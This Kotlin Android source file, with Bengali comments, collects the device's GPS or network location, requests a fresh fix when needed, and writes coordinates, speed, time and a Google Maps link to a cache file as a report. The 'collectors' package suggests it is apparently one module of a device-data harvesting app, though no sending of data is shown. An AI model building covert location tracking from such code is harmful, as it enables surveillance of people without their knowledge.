package com.kashem.shaikh.collectors

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.location.LocationListener
import android.location.LocationManager
import android.os.Bundle
import android.os.Looper
import androidx.core.content.ContextCompat
import com.kashem.shaikh.services.AppLogs
import java.io.File
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicReference

object Location {

    private const val FRESH_TIMEOUT_SEC = 20L
    private const val GOOD_ACCURACY_M = 50f

    fun collectLocation(context: Context): File? {
        val hasFine = ContextCompat.checkSelfPermission(
            context, Manifest.permission.ACCESS_FINE_LOCATION
        ) == PackageManager.PERMISSION_GRANTED
        val hasCoarse = ContextCompat.checkSelfPermission(
            context, Manifest.permission.ACCESS_COARSE_LOCATION
        ) == PackageManager.PERMISSION_GRANTED

        if (!hasFine && !hasCoarse) {
            AppLogs.warn("Location: permission denied")
            return null
        }

        val lm = context.getSystemService(Context.LOCATION_SERVICE) as? LocationManager
            ?: run {
                AppLogs.warn("Location: LocationManager unavailable")
                return null
            }

        val gpsEnabled = try { lm.isProviderEnabled(LocationManager.GPS_PROVIDER) }
                         catch (_: Exception) { false }
        val netEnabled = try { lm.isProviderEnabled(LocationManager.NETWORK_PROVIDER) }
                         catch (_: Exception) { false }
        val passiveEnabled = try { lm.isProviderEnabled(LocationManager.PASSIVE_PROVIDER) }
                             catch (_: Exception) { false }

        if (!gpsEnabled && !netEnabled && !passiveEnabled) {
            AppLogs.warn("Location: all providers disabled")
            return null
        }

        val providers = buildList {
            if (gpsEnabled) add(LocationManager.GPS_PROVIDER)
            if (netEnabled) add(LocationManager.NETWORK_PROVIDER)
            if (passiveEnabled) add(LocationManager.PASSIVE_PROVIDER)
        }

        // ১. শেষ পরিচিত location
        var loc: android.location.Location? = null
        for (p in providers) {
            try {
                val l = lm.getLastKnownLocation(p)
                if (l != null) {
                    val current = loc
                    if (current == null || l.time > current.time) loc = l
                }
            } catch (_: SecurityException) {
            } catch (_: Exception) {}
        }

        // ২. যদি ক্যাশ > ২ মিনিট পুরনো হয় → fresh location চেষ্টা
        val isRecent = loc != null && (System.currentTimeMillis() - loc.time) < 120_000
        if (!isRecent) {
            val fresh = requestFresh(lm, providers)
            if (fresh != null) loc = fresh
        }

        val finalLoc = loc ?: run {
            AppLogs.warn("Location: no location available")
            return null
        }

        val sb = StringBuilder()
        sb.appendLine("***** LOCATION *****")
        sb.appendLine()
        sb.appendLine("Latitude   : ${finalLoc.latitude}")
        sb.appendLine("Longitude  : ${finalLoc.longitude}")
        sb.appendLine("Accuracy   : ${finalLoc.accuracy} m")
        sb.appendLine("Altitude   : ${finalLoc.altitude} m")
        sb.appendLine("Speed      : ${finalLoc.speed} m/s")
        sb.appendLine("Provider   : ${finalLoc.provider}")
        sb.appendLine("Time       : ${
            SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date(finalLoc.time))
        }")
        sb.appendLine()
        sb.appendLine("Google Maps: https://maps.google.com/?q=${finalLoc.latitude},${finalLoc.longitude}")

        return try {
            val file = File(context.cacheDir, "location.txt")
            FileOutputStream(file).use { it.write(sb.toString().toByteArray()) }
            AppLogs.info("Location: ${finalLoc.latitude},${finalLoc.longitude} provider=${finalLoc.provider}")
            file
        } catch (e: Exception) {
            AppLogs.error("Location: file write failed", e)
            null
        }
    }

    /**
     * ✅ FIX: AtomicReference দিয়ে race-safe capture
     * - Callback main-thread-এ location লিখে
     * - Caller thread ২০ সেকেন্ড পর্যন্ত অপেক্ষা করে
     * - সবচেয়ে ভালো (কম accuracy) location জেতে
     */
    private fun requestFresh(
        lm: LocationManager,
        providers: List<String>
    ): android.location.Location? {
        val latch = CountDownLatch(1)
        // ✅ FIX: volatile guarantee — main thread → caller thread
        val resultRef = AtomicReference<android.location.Location?>(null)

        val listener = object : LocationListener {
            override fun onLocationChanged(location: android.location.Location) {
                val current = resultRef.get()
                if (current == null || location.accuracy < current.accuracy) {
                    resultRef.set(location)
                }
                // ✅ Good accuracy পেলে early exit
                if (location.accuracy in 0f..GOOD_ACCURACY_M) {
                    latch.countDown()
                }
            }
            override fun onProviderDisabled(provider: String) {}
            override fun onProviderEnabled(provider: String) {}
            @Deprecated("Deprecated in Java")
            override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
        }

        try {
            for (p in providers) {
                try {
                    lm.requestLocationUpdates(p, 0L, 0f, listener, Looper.getMainLooper())
                } catch (_: SecurityException) {
                } catch (_: Exception) {}
            }
            latch.await(FRESH_TIMEOUT_SEC, TimeUnit.SECONDS)
        } catch (_: Exception) {
        } finally {
            try { lm.removeUpdates(listener) } catch (_: Exception) {}
        }

        return resultRef.get()
    }
}